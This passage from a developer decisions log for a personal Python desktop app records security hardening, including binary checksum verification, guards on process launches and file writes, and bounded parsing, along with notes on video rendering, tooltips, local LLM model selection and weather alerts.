  would have meant re-plumbing a security control to gain nothing. So the
  guard stays as it was and hermes wraps around it: `bounded_dial()` around
  `_connect_public` (the same addresses, checked the same way, now handing back
  a deadline-aware socket), `hermes.TLS_CONTEXT` on the guarded connection, and
  `_fetch_bytes` inside `hermes.within()` with `hermes.read_bounded()`.
  `search_web` had no cap at all; it now has 64 KiB (Brave's answer measured
  10,334 B at count=3, 2026-10-01). A deadline cut arrives as a
  `TimeoutError`, so the existing `timeout` arms map it with no new code.
  Every address-guard test passes unchanged. *(2026-10-01.)*
- **Demeter's cap is computed from the box, not fixed.** An OpenTopography
  grid's size follows the area asked for and the latitude (a degree of
  longitude shrinks toward the poles), so one number would be either too
  tight in the north or loose everywhere else. `grid_cap(box)` is the cells a
  1/3 arc-second grid needs to cover the box, times the longest value
  measured plus its separator (19 bytes), times 1.5, plus a header allowance.
  Measured 2026-10-01 on two 0.01-degree boxes: OpenTopography writes
  full-precision floats, up to 18 characters, so a value's length follows its
  digits, not its height (17.99 bytes a cell at ~560 m, 16.29 at ~4,300 m). A
  full Artemis box at 39 N is ~3.8 M cells: a real download of ~69 MB against
  a cap of ~109 MB, and a deadline of ~18 minutes by hermes' rule. Every
  ingest logs the bytes received against the cap, so a real download keeps
  confirming the formula. *(2026-10-01.)*
- **The programs in `bin/` are vouched for before they run (`tools/aegis.py`,
  `config/bin_manifest.json`).** mpv, yt-dlp and ffmpeg run on every play,
  search, decode and Echo job, and parse media from the internet; none of the
  three is code-signed, so integrity has to come from checksums. Before this,
  nothing recorded where two of them came from. Decisions, each the owner's:
  (1) **A mismatch refuses.** A warning on a security check becomes a routine
  people click past, and then it is the cheapest path. The refusal is an ERROR
  for Emanon and a slug (`binary_unverified`) each tab turns into text that
  names the fix.
  (2) **A refused `bin/` copy never falls back to PATH.** Otherwise breaking the
  `bin/` copy would be a way to run whatever PATH holds.
  (3) **A program only on PATH runs, unverified, warned once.** It is the
  owner's own install, outside the manifest's reach; refusing it would only
  break a clone without `bin/`, and planting on PATH already takes local
  access.
  (4) **Recording an update is one command.** yt-dlp must be updated whenever
  YouTube changes, so a slow ritual would get skipped: `bin\yt-dlp.exe -U`, then
  `python -m tools.aegis record yt-dlp`, which checks the release's published
  `SHA2-256SUMS` and refuses on a mismatch. mpv and ffmpeg take `--expect` (the
  publisher's checksum) and, when that checksum is of an archive, the archive.
  (5) **Hashed once per program per process**, cached by path, size and mtime,
  so a file changed while Felhaven runs is checked again. Measured 2026-10-01:
  all three, 237.7 MB, hash in 1.28 s; the first panel build pays it.
  (6) **Tests**: `test_bin_manifest` checks the manifest's shape and that the
  code asks for exactly the programs it lists, everywhere; the real hashes
  wherever `bin/` exists (from a worktree, the main checkout's). CI has no
  `bin/`, so there it skips by name; anywhere else a missing `bin/` fails
  unless `FELHAVEN_NO_BIN=1`, because a quiet skip on the machine that runs
  Felhaven would hide exactly the mismatch this exists to catch. *(Changed
  2026-11-09: the manifest is per machine and no `bin/` skips; see "The bin
  manifest is per machine" below.)*
  **First recording (2026-10-01):** yt-dlp matched its release's
  `SHA2-256SUMS`, and ffmpeg was byte-identical to the one inside gyan.dev's
  8.1.2 essentials zip (the zip matching its published sha256). mpv was the
  right commit (v0.41.0-744-g304426c39) but a different build from any still
  published (built Jun 9 against FFmpeg N-124935; shinchiro's two builds of
  that commit are Jun 10, N-124930), so where it came from could not be
  proven. It was replaced with shinchiro's generic x86_64 build, whose archive
  matched its published sha256; the old copy was kept aside, not deleted.
  Known limit: a program swapped AFTER it was checked, while Felhaven runs, is
  not caught until the next launch; that needs local write access, and anyone
  with it can edit the code too. The versions were already public (morpheus.py,
  CHANGELOG), so the manifest reveals only the hashes. *(2026-10-01.)*
- **A connect that times out is both `Offline` and `Timeout`
  (`hermes.ConnectTimeout`).** Found in the live check: on Windows a
  connection to a CLOSED local port is refused only after ~2 s (measured
  2.03 s), which is Aether's whole Ollama budget, so a stopped Ollama showed
  as a timeout ("unknown", plus a WARNING) instead of "offline". requests had
  treated a connect timeout as a connection error too, and every reader's
  arms were written against that. So hermes raises one class that is both:
  Aura and Pheme, which ask `Timeout` first, answer exactly as before, and
  Aether's "Offline means offline" holds again. A deadline that runs out
  during the connect stays `DeadlinePassed`. *(2026-10-03.)*
- **Every process launch and shell opener is listed, with where its arguments
  come from (`tests/test_process_launches.py`).** A program reads an argument
  that starts with `-` as an option, and the shell's "open" RUNS an `.exe`,
  `.bat` or `.lnk` it is handed, so each such call is a place where a value from
  a feed, the model or a config file could become a command. Before this, the
  list of them lived only in someone's notes and went stale. Decisions, each
  the owner's:
  (1) **What counts:** something outside Python acts on a name we hand it. A
  program (`subprocess`, `os.system`/`popen`/`exec*`/`spawn*`, asyncio and pty
  subprocesses, `CreateProcess`, `WinExec`), the shell's open verb
  (`os.startfile`, `webbrowser`, `ShellExecute`), a shell file operation
  (`SHFileOperation`, since Artemis's is a whole-folder delete driven by a
  string), and Tcl's `exec`, since this is a Tk app. Every reference counts,
  through any import alias, so `f = subprocess.run` is a site too. Plain file
  writes and deletes are not launches.
  (2) **Keyed by file and function, never by line,** with the tuple of
  launchers the function uses. A line number changes with every edit above
  it; a function rarely moves. A second call, or a launcher swapped for
  another, changes the tuple and fails.
  (3) **A two-word verdict, checked against the sources.** Each line names
  where the arguments come from (constant, app path, owner, config, network,
  llm). `trusted` is allowed only when every source is a constant or the app's
  own path; otherwise it is `checked`, and the reason names the check. The
  file is published, so it holds only why each site is safe.
  (4) **A helper whose check is in its caller lists its callers,** and a new
  caller anywhere fails. Both this guard and semgrep look inside one function
  at a time, so a second caller that skipped the check would pass both.
  (5) **mpv's pipe is a launcher too.** mpv's `run` and `subprocess` commands
  start programs, `load-script` runs code, and `script-opts` names the yt-dlp
  its hook runs. Morpheus may only write the commands it uses today, and
  `cycle`/`set_property`/loadfile options only on `pause`, `volume` and
  `start`.
  **What it can't see**, written down rather than pretended: a module
  imported by a string that isn't a constant, exec/eval of Python source, a
  changed argument inside a call already listed, files outside
  `metis_toolbox/` or not in Python (`Felhaven.bat`, `publish-snapshot.sh`),
  and untracked files. The guard reads `git ls-files`, so a new file is
  invisible to it until staged. *(2026-10-03.)*
- **The semgrep tripwire is run by hand, never in CI
  (`tests/semgrep/felhaven_sinks.yml`).** It traces a value from the network,
  a config or environment read, or a model-facing argument into a launch,
  which catches what the launch guard can't: an argument whose source changed
  inside a launch already listed. In CI it would need its own hashed lock for
  64 packages (an MCP server, a web server, telemetry exporters among them) and
  a 236 MB native binary, released weekly (measured 2026-10-03); the runtime
  lock is 22 packages. That is the surface the hashed lock was built to cut
  away, added back for a tripwire. So it runs from a venv of its own when the
  launch guard reports a new site and at each security review, with
  `--metrics=off`. Its sinks are generated from the launch guard's own tables
  and held equal by text, not by parsing YAML: no YAML parser is in the lock,
  and a check that reads a file differently from the program that consumes it
  can pass a file that program rejects. semgrep checks the rule itself, with
  its own test format (`felhaven_sinks.py`). One source changed when it moved
  in: `subprocess.run(...).stdout` never matched the code's
  `proc = subprocess.run(...)` then `proc.stdout`, and it contains a sink, so
  semgrep reported each such call against itself. *(2026-10-03.)*
- **ffmpeg is only ever handed absolute paths (Echo, Orpheus).** ffmpeg reads
  an argument starting with `-` as an option, and one with `name:` before its
  first slash as a protocol (`concat:`, `http:`). An absolute path can be
  neither, since ffmpeg reads a leading drive letter as a plain file. Every
  path was already absolute by construction (measured: `mkstemp` returns one
  even for `dir='.'` on 3.13), so `_encode_opus`, `_probe_duration` and
  `_decode` now refuse anything else before ffmpeg starts. Not ffmpeg's
  `file:` prefix: that changes three working command lines to defend against a
  value that can't occur, and would hide the day the paths stop being
  absolute (a portable, relative audio folder is plausible under §11). The
  check makes that day loud. *(2026-10-03.)*
- **`morpheus.play()` loads only `http://` and `https://` URLs.** mpv's
  loadfile also opens a local path and its own `edl://`, `lavfi://` and
  `av://` sources. Every caller passed a web URL, and the panel's add form
  checked saved playlists, but `config/morpheus_playlists.json` is
  hand-editable, and nothing at the program boundary checked. The check is
  case-sensitive, so anything unexpected fails closed, and it runs before mpv
  starts, like `describe()`'s. *(2026-10-03.)*
- **`aegis record yt-dlp` vouches for the file before it runs.** The version,
  which names the release whose checksums to fetch, is only known by running
  the file, so `record` used to be the first thing to execute a fresh `-U`
  download, before anything had vouched for it. Now the file must first appear
  in the LATEST release's published `SHA2-256SUMS` (what `-U` installs); only
  then does `--version` run, and that version's own sums must agree too. A
  file that isn't the latest release is refused without running, and the fix
  is to run `-U` again. Checked live on the real `bin/yt-dlp.exe`: the genuine
  file recorded identically after one run; a copy with one byte added was
  refused with none. *(2026-10-03.)*
- **Demeter parses the grid from its bytes, a window at a time, into int16,
  and refuses a header bigger than its box first.** The download was capped,
  but not what the parse built from it: the whole text decoded (a second
  copy), split into one `str` per value, then a list of ints. Measured
  2026-10-03 on a full box's worth of OpenTopography-shaped values (3.8 M
  cells, 68 MB): 7.5x the download (536 MB working set) in 2.31 s; values of
  two characters at the cap reached 27.7x, ~3.0 GB. `parse_aaigrid(body,
  max_cells)` now splits the bytes 256 KiB at a time, each window widened to
  the next whitespace, straight into an `array("h")`: 0.13x (8.8 MB) in
  2.12 s. Two alternatives were measured first: a regex scan was as lean but
  40% slower (a match object per value, in the loop), and numpy's
  `fromstring` was the slowest (5.09 s) at 1.9x, and would have brought numpy
  into a stdlib module. The header's ncols x nrows sizes the array and comes
  from the server, so it is checked before anything is allocated: at most
  1.5x `grid_cells(box)`, a margin of its own (`grid_cap`'s absorbs value
  lengths, this one the grid's extent). At that limit a hostile grid parses
  in 2.1 s at 0.16x; past it, it is refused at once. No cellsize check: it
  bounds nothing (resample's cost is fixed by `GRID`), and a server that lies
  can lie at the right cellsize. A value over 64 bytes is refused wherever the
  window edges fall (the longest real one is 18), and a bad token is quoted
  at most 40 characters. One used to be quoted whole, so a single garbage
  value could write ~109 MB to the log twice, roll the 1 MB log past its
  three backups, and stay out of Emanon's 64 KB tail. A non-finite header
  field is `bad_grid` too: `int(inf)` escaped as `OverflowError` past
  ingest's catch and failed the whole area. Kept exactly: the NODATA rule,
  half-to-even rounding, every slug. Changed only for garbage: non-ASCII
  whitespace no longer separates values, and a short body that also holds a
  bad value reports the bad value. Every ingest logs the grid's cells against
  the limit, as it logs bytes against the cap. A tracemalloc test holds an
  ingest under the download's own size (0.51x), a literal, never a constant
  under test. *(2026-10-03.)*
- **Cadmus decodes a part into one `array("d")`, and checks the .dbf's record
  count before decoding it.** A part was a list of (x, y) tuples, ~112 bytes
  a point against 16 in the file: on the largest real county (41019 roads,
  37 MB .shp) `read_pair` peaked at 6.3x (324 MB working set) in 0.79 s. Now
  1.5x (64 MB) in 0.20 s, every point identical; `cadmus.points(part)` gives
  the pairs. The worst case was the .dbf: a dict per record, so a .dbf of
  one-byte records reached ~96x, ~5.35 GB from one 53 MiB zip member (such a
  zip is tiny, so the member cap is the bound that binds). `read_pair` now
  refuses a .dbf declaring a different record count from the .shp before it
  decodes a record. Accepted residual: both files agreeing on ~4.6 M empty
  records (all that 53 MiB of 12-byte .shp records holds) still costs
  ~1.75 GB. Removing it would mean storing records by column across Hecate,
  Poseidon and Artemis, too much change for a cost that needs a compromised
  Census server behind TLS. A tracemalloc test holds a 65,536-point part under
  twice the file (1.06x; tuples were 8.0x). *(2026-10-03.)*
- **Every file write, move and delete is listed, with where its path comes
  from (`tests/test_file_writes.py`).** The launch guard's twin. A write whose
  path an outsider can steer lands wherever this account may write, and a
  delete driven by a string can take a whole tree. The list lived nowhere: a
  grep found 20 files and missed six kinds of site (Calliope's `save_wav`, a
  developer's CLI, two non-Windows fallbacks, `os.utime`, the mpv pipe's
  `"r+b"` opens); the AST finds 38 functions, 93 references, 21 files.
  Decisions, each the owner's:
  (1) **What counts:** anything that creates, changes, moves or deletes a file
  or folder: `open` and friends in a write mode (or a mode that isn't a
  constant), the `os`, `shutil` and `tempfile` writers, archive and log
  handlers, pathlib's methods on any expression, the Win32 file calls and
  Tcl's `file`. Every reference through any alias, as in the launch guard.
  Writing into a handle isn't a site; the call that opened it is. Writes made
  by a program we start stay in the launch guard.
  (2) **Keyed like the launch guard**, by file and function with the tuple of
  operations, plus the folders written in and SOURCES that describe the PATH,
  not the content. The verdict rule and the `callers` rule are the launch
  guard's, imported from it rather than copied. Artemis's `discard_partial`
  and `commit_area` list their caller though they are public: they check
  nothing, and are safe only because `ingest_area` hands them `area_id()`'s
  digits.
  (3) **Atomicity is derived, not declared.** A function that writes content
  with no `os.replace` in the same function must be in `_IN_PLACE` with why
  (the log, mpv's failure snapshot, a fresh temp WAV, the pipe, Euterpe's
  `.bak`, Artemis's copy into a `.partial`). A hand-set flag on each line
  could drift from the code; a rule read off the code can't.
  (4) **`.replace(` with exactly one argument is pathlib's.** `str.replace`
  takes two or three, `datetime.replace` only keywords: true of all 21 hits.
  **Measured with it:** Python 3.13's `rmtree` refuses a path that is itself a
  junction and unlinks one inside without following it, so `discard_partial`
  deletes nothing and `commit_area` raises (the ingest fails cleanly);
  Windows 11 makes `CON .opus` an ordinary file, not the console.
  **What it can't see**, written down rather than pretended: a path built
  more than one call up, `Path.open(mode)` with the mode in a variable, a
  write method on an object the AST can't type (Tk's `PhotoImage.write`), a
  module imported by a string that isn't a constant, exec/eval, and files
  outside `metis_toolbox/` or untracked. *(2026-10-05.)*
- **The semgrep tripwire gets no write sinks yet.** Every path built from the
  network, the model or the keyboard crosses a function boundary before
  anything is written (Herodotus's `_resolve` before `_atomic_write`,
  Artemis's `area_id` before its writers, Echo's `sanitize_filename` before
  ffmpeg), and open-source semgrep follows taint inside one function, so
  write sinks would find nothing today. They would cost each operation's path
  position in the generator and a fresh install of semgrep to validate the
  rule. The file-write guard's review is the gate; BACKLOG holds the trigger.
  *(2026-10-05.)*
- **A log record is one entry (`metis_logging._OneEntryFormatter`).** Emanon
  opens the log in text mode and splits it with `str.splitlines()`, which ends
  a line at ten characters, not only `\n`: also `\r`, `\x0b`, `\x0c`,
  `\x1c` to `\x1e`, U+0085, U+2028 and U+2029. A message quoting outside text
  could start a line that Emanon read as a real entry, level and logger
  included, and two did: Demeter quoting the start of an unparseable
  elevation reply (it replaced only `\n`), and Artemis naming a county by the
  ID read from the Census file in its retry warning. Now the message is
  escaped onto one line, each break written as its escape, and the lines
  after a record's first keep their breaks but turn ` | ` into ` ¦ `, so a
  traceback that quotes a server still reads as a traceback and can't parse
  as an entry. Escaping CR and LF alone would have missed eight characters
  and the traceback. A test holds the list of breaks to what `splitlines()`
  actually splits on, asked of Python rather than written by hand, and the
  tests read the log through Emanon's own reader. Cost: a message that held a
  real line break (yt-dlp's or ffmpeg's stderr) now shows it as an escape,
  all on Emanon's one row. *(2026-10-05.)*
- **Ammit saves through a temp file and `os.replace`.** It was the one state
  file written where it stood (`write_text`), so a crash mid-write tore it,
  and `_load()` reads a torn file as "no timer". It now uses the argus/plutus
  shape. Robustness, not security; the file-write guard's in-place rule found
  it. *(2026-10-05.)*
- **Eratosthenes refuses a coordinate that isn't on the map.** Typed
  coordinates and Themis were range-checked; waypoints and the geocoder only
  called `float()`, and json reads `NaN` and `Infinity`. A NaN reached
  Artemis's `area_status()`, documented never to raise, which raised inside
  the search's Tk callback, so the search silently did nothing. No write was
  reachable: `area_id()` raises on a non-finite number and only ever formats
  digits and n/s/e/w/p. Fixed where the values enter, so Artemis can assume a
  real place. *(2026-10-05.)*
- **Clio speaks through Calliope's seam, not through Echo.** The video plan
  said to call Echo, the house's text-to-file tool. Echo is built for a
  different job, Markdown to one `.opus` in `local_audio/`, and four parts of
  that job are wrong for a video. It strips Markdown characters and list
  numbers, so the spoken words could differ from the script. It encodes to
  Opus, so the audio would be lossily compressed twice. Every cached line
  would land in `local_audio/`, Orpheus's library. And it cuts text at 400
  characters, so the batch stutter Matthew wants kept (live narration
  synthesizes 70-character chunks one at a time) would vanish from most
  lines. Clio calls `take_chunk`, `synthesize` and `save_wav` directly at
  live narration's chunk caps: the seam Echo itself uses, so there is still
  one model and one WAV writer. It refuses a line holding a character
  Calliope strips, so the words spoken are the words written. Calliope gained
  a per-call `speed=` for it: Clio renders at 1.3 while live narration keeps
  its configured 1.0. *(2026-10-28.)*
- **Clio's face is the real widget, rendered off-screen in a child process.**
  The prototype redrew the face with Pillow. That was a second copy of its
  geometry, missing the rim glow, the ramps and the sweep, and a new
  dependency. Clio steps the real `PythiaFace` with `advance()` on the
  video's clock in `panels/clio_face.py`, run as a child process so Tk and the
  Win32 calls stay out of a tool (§0), and reads each frame back with
  `PrintWindow`. Two measured findings shape that code. First, the read-back:
  `PW_RENDERFULLCONTENT` reads the compositor's copy of the window, which
  lagged. The first frames came back black and one in ten stale or
  half-drawn, flushed or not. Flag 0 asks the window to paint itself and left
  one stale grab in fifty, which `grab_fresh()` catches because the face
  never draws the same frame twice running. Second, the face's own
  `<Map>`-started loop is unbound there, or a late Map runs it inside the
  renderer's updates. With both, two renders of an episode are
  byte-identical. *(2026-10-28.)*
- **Clio normalizes loudness with a compressor and a limiter, not
  loudnorm.** The plan said two-pass loudnorm to -14 LUFS. Pythia's speech
  has about 21 dB between its peaks and its loudness, so -14 means about +7 dB
  on peaks already near 0 dBTP. loudnorm's linear mode won't apply gain that
  clips, and its dynamic mode settled at -16 LUFS on these clips. Clio
  compresses 3:1 above -24 dBFS, applies the measured gain, limits at -2 dBFS
  at twice the sample rate, and corrects once from a fresh measurement: -14.1
  LUFS and -1.8 dBTP on the concept reel. Every episode also ends with 0.1 s
  more silence than the script's last hold. Raising the gain raises the last
  word's fading tail too, and the measured hold came out about 25 ms short of
  the 1.5 s a looping reel needs. *(2026-10-28.)*
- **Clio's title is set in Georgia, outside `theme.FONTS`.** Felhaven's own
  face is Consolas, and the captions use it. The serif wordmark is the
  prototype's look, and Georgia ships with Windows as Consolas does. Widths
  come from the font files themselves (a small TrueType reader in Clio), so
  the safe-zone check is arithmetic for both faces, not a guess.
  *(2026-10-28.)*
- **Clio's long-form captions sit below the panel, not over it.** The video
  plan had the captured panel fill the frame, with captions in a band over
  its bottom. The first real capture showed what that band would hide:
  Felhaven's input bar runs along the bottom of the window, and typing into
  it is half of any Pythia walkthrough. So the panel is fitted into the area
  above a two-line strip and nothing in the app is ever covered. On a window
  shaped like today's (960x668), her face inset lands in the side margin,
  not on the app. The cost is a smaller panel. Maximizing Felhaven before
  capturing gives sharper footage, since a 960-wide window is upscaled
  about 1.3 times. In the strip, the script's line breaks are ignored and the
  words re-flowed, because breaks written for the vertical box's
  27-character lines would stack past two lines there. The words stay
  verbatim either way. *(2026-10-28.)*
- **Clio's face window is on screen and invisible, not off screen.** The
  face entry above placed it at (-4000, -4000), and that rendered at about
  50 ms a frame all through phases 2 to 4. The same day, with the machine
  idle, it slowed to about 1 s a frame: Windows had started painting the
  off-screen window lazily, so 18 grabs in 19 came back stale. The display
  being asleep was ruled out by holding it on. The same window on screen
  painted every grab, and it still does at zero opacity, where nothing
  shows and PrintWindow reads it all the same. So it now sits at the
  screen's corner at zero opacity, and `grab_fresh()` stays as the guard.
  The output never changed, only the speed: a stale grab was always grabbed
  again, never written. *(2026-10-28.)*
- **The bin manifest is per machine, and `test_bin_manifest` skips where there
  is no `bin/` (`tools/aegis.py`, `config/bin_manifest.json`).** This changes
  two parts of the 2026-10-01 Aegis entry above. An outside review found that
  a fresh clone failed the suite: the real-program check failed wherever no
  `bin/` was found unless `FELHAVEN_NO_BIN=1` was set, and no setup doc named
  the variable. The committed manifest also held one machine's hashes, so a
  clone's newer yt-dlp was refused, and recording it edited a tracked file
  that would conflict on every pull. Both came from one file holding two kinds
  of fact: which programs Felhaven uses, which is code, and what is in this
  machine's `bin/`, which is machine state (`bin/` itself is gitignored).
  Decisions, each the owner's:
  (1) **The manifest is gitignored, and each machine records its own.** The
  same reasoning as the PIN files: a clone records its own instead of
  inheriting the author's. `record` already checks a download against its
  publisher's checksum, so each machine vouches for its own copies. The list
  of programs moved into the code as `aegis.PROGRAMS`; the lockstep test now
  holds the code to it, and `record` refuses any other name.
  (2) **No `bin/` skips.** The 2026-10-01 reason for failing was that a quiet
  skip on Obelisk would hide a mismatch. A mismatch needs a `bin/`, so with a
  skip the one way to hide one is a lookup that fails quietly: from a
  worktree the test finds `bin/` through git, and the old lookup turned a git
  error into "no `bin/`". Now a git error fails the test, the main checkout's
  path is worked out from git instead of naming `metis_toolbox`, and a test
  that runs everywhere proves the lookup lands on a folder holding
  `felhaven.py`. `FELHAVEN_NO_BIN` and the `GITHUB_ACTIONS` case are gone: CI
  skips by the same rule as any machine without `bin/`. A `bin/` holding
  programs with no manifest still fails, since Felhaven would refuse them.
  (3) **The runtime rule is unchanged.** An unrecorded or mismatched `bin/`
  copy is refused and never falls back to PATH. With no manifest at all, the
  tab and the log now say the program isn't recorded yet, rather than that
  the manifest is unreadable.
  The cost, accepted: an edited manifest no longer shows in `git status`, and
  later recordings leave no trail in git history. Neither was a real defence.
  The entry above already concedes that anyone with local write access can
  edit the code, and `.venv`, also untracked, holds code that runs on every
  launch. *(2026-11-09.)*
- **Virgil's hover tooltips: two modules, two sources (`tools/virgil.py`,
  `panels/virgil_tooltip.py`, `config/virgil_glossary.json`).** Decisions:
  (1) **Two modules.** `virgil.py` turns a tip into words and draws nothing;
  `virgil_tooltip.py` draws and decides nothing about the words (§0). The
  headless half is testable without Tk, and it is the seam a later Pythia
  tool would use. The panel is not also named `virgil.py`, because Daedalus
  keys modules by file stem across the app root, `tools/` and `panels/`, and
  two of one stem collide.
  (2) **A module's words come from Daedalus, never from importing it.**
  Importing a module to read its `__doc__` runs its threads, sockets and
  audio. Daedalus's new `gloss()` answers from its current view, without
  `index()`'s deep copy of every node, because a hover asks on every show.
  (3) **No glossary key may equal a module key** (`test_virgil` holds it). A
  module is described by its docstring only; a glossary entry for one would
  be a second copy, and copies drift. Home's key is `home` because `felhaven`
  is a module.
  (4) **A module gloss is drawn in `C["verbatim"]`, a glossary entry in
  `C["text2"]`.** A gloss is the module's own words, quoted, which is what
  `verbatim` already meant for a Daedalus docstring in the chat.
  (5) **No brain tool in v1.** Module glosses already reach Pythia through
  Daedalus's enum, and a glossary tool would add prompt tokens to every chat
  turn on gemma4:e2b. Parked in BACKLOG with its trigger, not dropped.
  (6) **One shared tooltip window per root**, borderless and transient to the
  root, never one Toplevel per widget: many widgets attach, and at most one
  tip is on screen.
  (7) **Shown after 500 ms, by one one-shot `after()` on the root**, never on
  the attached widget, whose destruction would orphan it. The tip window is
  the root's child, so `Tk.destroy()` reaches its `destroy()` override while
  the root's commands still exist, and it cancels there.
  (8) **`<Leave>` is judged by the pointer, not the event.** A composite
  widget (a SidebarRow is a frame of frames and labels) hears `<Leave>` when
  the pointer moves onto its own child, so the tip hides only once the
  pointer is outside the widget's rectangle.
  Two things found while building it, each held by a test: Tk runs only the
  most specific binding a widget has for an event, so a bare `<ButtonPress>`
  never fired on a row with its own `<Button-1>` — the click that hides the
  tip is bound per button (`<ButtonPress-1>` and its siblings), which appends
  to the row's script instead. And on Windows a widget hears `<Unmap>` when
  its whole view is packed away, so view switches hide the tip through that
  handler; the viewable re-check before showing is the backstop. *(2026-11-09.)*
- **§0's gloss limit is exact and every module is held to it
  (`tests/test_daedalus.py`).** It said "≤ ~90", and fifteen glosses had
  grown past it, two of them on surfaces Virgil now shows. Each was cut to
  one sentence, with the dropped detail moved into the next. Two kinds of
  module are exempt by name, each listed in the test with its reason:
  `felhaven.py`, whose prose docstring is a choice its V0.02 note records
  (the entry point is a shell, not a tool), and fourteen panels written
  before §0 asked for a `Job:` field, whose fallback first line already fits.
  The panels come off the list as each gains one (BACKLOG); a stale
  exemption fails. *(2026-11-09.)*
- **Pythia's thinking and temperature are the owner's, saved by Themis
  (`themis.py`, `pythia.py`, the MACHINE SPIRIT tab).** Measured first on the
  Obelisk (Ollama 0.40.13): gemma4:e2b lists `thinking` among its
  capabilities; with it on, each round writes 150–650 tokens of reasoning
  (3–10 s at ~68 tok/s), and tool calls stayed correct (6 of 6). Changing
  temperature, top_p or seed reloads nothing (3–4 ms), unlike num_ctx.
  Decisions:
  (1) **Themis owns them**, beside the planned model choice: they are
  per-install preferences, read at each request the way Aura reads the
  location. `save()` carries them over, because the Settings form doesn't
  show them, and `save_pythia()` carries the location over.
  (2) **The defaults change nothing.** Thinking is off, and temperature is
  None, which sends no temperature at all, so the model keeps its own
  default (gemma4:e2b: 1.0) — and a different model later keeps its own.
  (3) **The reasoning is still dropped**, never shown or spoken (the
  2026-07-31 rule). Thinking makes an answer slower and more careful, not
  longer on screen.
  (4) **A thinking round gets a 3072-token budget.** The reasoning counts
  against `num_predict`; one measured round spent 656 of the 1024.
  (5) **Read once per question**, so a change mid-answer applies to the next
  one. The warm follows the thinking setting, because flipping it changes the
  rendered prompt: the first request after a flip re-read the whole prefix
  (15.4 s against 3.7 s).
  (6) **Auto-DJ turns never think** (`ask(think=False)`): a pick runs in the
  gap between songs, and reasoning would stretch the silence by 5–20 s. The
  owner's temperature does apply to them.
  Left out on purpose: top_p and top_k (the same job as temperature, harder
  to explain), num_ctx (every change reloads the model, ~70 s), and seed
  (only useful for testing). *(2026-11-09.)*
- **The GPU through NVML by absolute path (`tools/brontes.py`), and Ollama's
  models through Hermes (`tools/talos.py`).** Decisions:
  (1) **NVML by ctypes**, not `nvidia-ml-py` (no new package, §11) and not
  `nvidia-smi` (a process every 5 s, and another launch to list).
  (2) **`nvml.dll` is loaded by its absolute System32 path.** A bare name is
  searched for in the app folder and the working directory first, so a file
  of that name planted beside Felhaven would load into its process. A file
  that isn't at the absolute path is no GPU.
  (3) **A failed start is remembered and logged once**: a machine without the
  library would otherwise retry and log every 5 s.
  (4) **Talos reads `/api/show`, a POST, through a new `hermes.post()`**
  rather than an allowlist entry in `test_network_reads`: the guarded reader
  stays the only way out, with the same cap and deadline, and a POST never
  follows a redirect. `/api/show` (26.5 KB, mostly the license) is read
  once per model digest.
  (5) **Talos reports; Pythia acts.** Loading, unloading and chatting stay in
  pythia.py, which is already allowed its streaming chat. *(2026-11-09.)*
- **Pythia's model is the owner's pick (`themis.py`, `pythia.py`, the MACHINE
  SPIRIT tab).** Decisions:
  (1) **Read once per question**, like thinking and temperature; a pick
  mid-answer applies to the next one.
  (2) **Only models that can use tools are listed.** A model without them
  would lose every tool, silently. A saved model that isn't listed (Ollama
  down, or not pulled) stays shown rather than being replaced.
  (3) **Thinking goes only to a model that can**: Ollama refuses the whole
  request otherwise. An unknown model keeps the setting, and the tab greys
  THINKING for a known non-thinker while keeping the setting for one that can.
  (4) **A switch unloads only the model Felhaven was using** (keep_alive 0),
  never another app's on the same Ollama, then warms the new one on pythia's
  thread, one switch at a time, so two models never load onto the GPU
  together. `PYTHIA_MODEL` remains the default for an install with no pick.
  Only gemma4:e2b was installed when this landed; the download of tested
  models is the next round (BACKLOG). *(2026-11-09.)*
- **Candidate models for Pythia, tested; gemma4:e2b stays (2026-11-10).**
  The owner approved pulling two candidates. Each was cold-loaded and asked
  ten questions twice through Pythia's real prompt, all 23 tools and the
  16,384-token context, scored on the first round: the right tool with
  arguments that pass `_check_arguments`, or no tool for small talk. GPU
  memory is read through NVML (Brontes) with nothing else loaded, because
  Ollama's `size_vram` under-counts gemma4 badly.

  | Model | Right | GPU memory | Speed | Load | A round | Disk |
  |---|---|---|---|---|---|---|
  | gemma4:e2b, Jul build (`7fbdbf8f`) | 20/20 | 2.82 GB | 76 tok/s | 26 s | 0.3 s | 7.2 GB |
  | **gemma4:e2b, Nov build (`b3704936`)** | **20/20** | **3.08 GB** | **114 tok/s** | **19 s** | **0.3 s** | **4.6 GB** |
  | gemma4:e4b | 17/20 | 4.52 GB | 49 tok/s | 80 s | 0.6 s | 6.6 GB |
  | qwen3.5:4b | 18/20 | 4.03 GB | 44 tok/s | 28 s | 2.8 s | 3.3 GB |

  e4b twice named a module (`horai`) instead of the tool, which the
  dispatcher refuses, and once answered the news question without looking;
  it also leaves about 0.5 GB of the GTX 1660's 6 GB free. qwen3.5:4b twice
  answered "tell me a joke" with `get_module_docstring`, and spends about
  3 s on each new question before the first token. All passed with thinking
  on. The registry's current gemma4:e2b turned out to be a newer build than
  the one installed in July; the owner had it re-pulled (it replaces the old
  one under the same tag), and it is faster and smaller for 0.26 GB more GPU
  memory, likely its speculative-decoding draft (`draft_num_predict 3` in
  its parameters). So the tested list is gemma4:e2b's November build alone,
  and two displays changed: the loaded-model lines show the GPU share and
  never Ollama's GB figure, which under-counts gemma4 (the November e2b
  reports 0.32 GB of 3.08; the July build 1.61 of 2.82; e4b 0.34 of 4.52).
  *(2026-11-10.)*
- **Weather warnings: Iris reads the National Weather Service, and one
  controller drives every display (`tools/iris.py`, `panels/iris_panel.py`).**
  The owner approved the placement mockups' format (2026-11-09); space
  weather, its second half, is a later PR (BACKLOG). Decisions:
  (1) **A failed check never reads as "none active."** Iris raises on any
  failure, so Kairos delivers None, and the panel keeps the last list,
  dimmed, under "couldn't check since <time>". A place outside the US is a
  checked answer of its own (the NWS answers 400 "out of bounds").
  (2) **Tiers by the event's name**, because NWS names say what to do:
  Warning or Emergency (and "Evacuation Immediate", "Civil Emergency
  Message", or severity Extreme) pops up; a Watch pops up only when
  Settings says so; advisories and statements are only listed.
  (3) **One controller, one view.** AlertWatch holds what was seen and what
  popped up, and every display renders the same view, so acknowledging
  turns all of them amber, "seen · still in effect", together, until the
  Weather Service ends the alert (the Ammit rule of 2026-09-14). Closing the
  popup acknowledges, as Ammit's does; OPEN ALERTS only opens the tab.
  (4) **Seen follows a reissue.** NWS extends a warning under a new id that
  references the old one; it stays seen when the event name matches, and
  pops up when it doesn't (a Watch upgraded to a Warning). Seen lives in
  memory: a restart pops a still-active warning up once more, and writes no
  file. An alert that ended is forgotten, so a later issue is news.
